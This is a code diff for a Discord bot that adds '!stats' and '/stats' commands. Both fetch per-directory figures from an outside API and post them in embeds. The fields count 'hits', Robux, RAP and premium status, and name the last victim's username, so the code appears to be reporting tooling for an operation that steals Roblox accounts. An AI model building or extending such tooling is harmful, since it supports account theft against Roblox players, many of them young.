@@ -599,6 +599,15 @@ const commands = [
         .setMinValue(1)
         .setMaxValue(100))
     .setDefaultMemberPermissions(0)
+    .setDMPermission(false),
+
+  new SlashCommandBuilder()
+    .setName('stats')
+    .setDescription('Get statistics for a directory')
+    .addStringOption(option =>
+      option.setName('directory')
+        .setDescription('Directory name (e.g., mydirectory or parentdir/subdir)')
+        .setRequired(true))
     .setDMPermission(false)
 ].map(command => command.toJSON());
 
@@ -1009,6 +1018,81 @@ client.on('messageCreate', async message => {
           value: '• Try again in a few moments\n• Contact server administrators if the problem persists', 
           inline: false 
         })
+        .setTimestamp();
+
+      await message.reply({ embeds: [errorEmbed] });
+    }
+  }
+
+  // Check for !stats command
+  if (message.content.toLowerCase().startsWith('!stats ')) {
+    const directory = message.content.slice(7).trim(); // Remove "!stats "
+    
+    if (!directory) {
+      const noDirectoryEmbed = new EmbedBuilder()
+        .setColor('#2C2F33')
+        .setTitle('Missing Directory')
+        .setDescription('Please provide a directory name. Example: `!stats mydirectory`')
+        .setTimestamp();
+
+      await message.reply({ embeds: [noDirectoryEmbed] });
+      return;
+    }
+
+    try {
+      const loadingEmbed = new EmbedBuilder()
+        .setColor('#2C2F33')
+        .setTitle('📊 Fetching Stats...')
+        .setDescription(`Loading statistics for **${directory}**`)
+        .setTimestamp();
+
+      const loadingMessage = await message.reply({ embeds: [loadingEmbed] });
+
+      const response = await fetch(`https://incbot.site/api/bot/stats/${directory}`);
+      const data = await response.json();
+      
+      if (response.ok) {
+        const statsEmbed = new EmbedBuilder()
+          .setColor(0x8B5CF6)
+          .setTitle(`📊 Stats for ${data.directory}`)
+          .addFields(
+            { name: '📈 Total Hits', value: data.stats.totalAccounts.toLocaleString(), inline: true },
+            { name: '💰 Total Summary', value: data.stats.totalSummary.toLocaleString(), inline: true },
+            { name: '🟡 Total Robux', value: data.stats.totalRobux.toLocaleString(), inline: true },
+            { name: '🆕 Today Hits', value: data.stats.todayAccounts.toLocaleString(), inline: true },
+            { name: '📊 Today Summary', value: data.stats.todaySummary.toLocaleString(), inline: true },
+            { name: '🎯 Today Robux', value: data.stats.todayRobux.toLocaleString(), inline: true },
+            { name: '💎 Total RAP', value: data.stats.totalRAP.toLocaleString(), inline: true },
+            { name: '⭐ Today RAP', value: data.stats.todayRAP.toLocaleString(), inline: true }
+          )
+          .setTimestamp();
+        
+        if (data.lastHit) {
+          const lastHitTime = new Date(data.lastHit.timestamp);
+          const premiumText = data.lastHit.premium ? ' 👑' : '';
+          statsEmbed.setFooter({ 
+            text: `Last hit: ${data.lastHit.username} (${data.lastHit.robux.toLocaleString()} Robux)${premiumText} • ${lastHitTime.toLocaleString()}` 
+          });
+        }
+        
+        await loadingMessage.edit({ embeds: [statsEmbed] });
+        console.log(`${message.author.username} fetched stats for directory: ${directory}`);
+      } else {
+        const errorEmbed = new EmbedBuilder()
+          .setColor('#2C2F33')
+          .setTitle('❌ Error')
+          .setDescription(data.error || 'Failed to fetch statistics')
+          .setTimestamp();
+
+        await loadingMessage.edit({ embeds: [errorEmbed] });
+      }
+    } catch (error) {
+      console.error(`Error fetching stats for ${message.author.username}:`, error);
+
+      const errorEmbed = new EmbedBuilder()
+        .setColor('#2C2F33')
+        .setTitle('❌ Failed to fetch stats')
+        .setDescription('Unable to connect to the stats API. Please try again later.')
         .setTimestamp();
 
       await message.reply({ embeds: [errorEmbed] });
@@ -1771,6 +1855,63 @@ client.on('interactionCreate', async interaction => {
             .setTimestamp();
 
           await interaction.reply({ embeds: [errorEmbed], ephemeral: true });
+        }
+        break;
+
+      case 'stats':
+        const directory = interaction.options.getString('directory');
+
+        await interaction.deferReply();
+
+        try {
+          const response = await fetch(`https://incbot.site/api/bot/stats/${directory}`);
+          const data = await response.json();
+          
+          if (response.ok) {
+            const statsEmbed = new EmbedBuilder()
+              .setColor(0x8B5CF6)
+              .setTitle(`📊 Stats for ${data.directory}`)
+              .addFields(
+                { name: '📈 Total Hits', value: data.stats.totalAccounts.toLocaleString(), inline: true },
+                { name: '💰 Total Summary', value: data.stats.totalSummary.toLocaleString(), inline: true },
+                { name: '🟡 Total Robux', value: data.stats.totalRobux.toLocaleString(), inline: true },
+                { name: '🆕 Today Hits', value: data.stats.todayAccounts.toLocaleString(), inline: true },
+                { name: '📊 Today Summary', value: data.stats.todaySummary.toLocaleString(), inline: true },
+                { name: '🎯 Today Robux', value: data.stats.todayRobux.toLocaleString(), inline: true },
+                { name: '💎 Total RAP', value: data.stats.totalRAP.toLocaleString(), inline: true },
+                { name: '⭐ Today RAP', value: data.stats.todayRAP.toLocaleString(), inline: true }
+              )
+              .setTimestamp();
+            
+            if (data.lastHit) {
+              const lastHitTime = new Date(data.lastHit.timestamp);
+              const premiumText = data.lastHit.premium ? ' 👑' : '';
+              statsEmbed.setFooter({ 
+                text: `Last hit: ${data.lastHit.username} (${data.lastHit.robux.toLocaleString()} Robux)${premiumText} • ${lastHitTime.toLocaleString()}` 
+              });
+            }
+            
+            await interaction.editReply({ embeds: [statsEmbed] });
+            console.log(`${interaction.user.username} fetched stats for directory: ${directory}`);
+          } else {
+            const errorEmbed = new EmbedBuilder()
+              .setColor('#2C2F33')
+              .setTitle('❌ Error')
+              .setDescription(data.error || 'Failed to fetch statistics')
+              .setTimestamp();
+
+            await interaction.editReply({ embeds: [errorEmbed] });
+          }
+        } catch (error) {
+          console.error(`Error fetching stats for ${interaction.user.username}:`, error);
+
+          const errorEmbed = new EmbedBuilder()
+            .setColor('#2C2F33')
+            .setTitle('❌ Failed to fetch stats')
+            .setDescription('Unable to connect to the stats API. Please try again later.')
+            .setTimestamp();
+
+          await interaction.editReply({ embeds: [errorEmbed] });
         }
         break;
     }
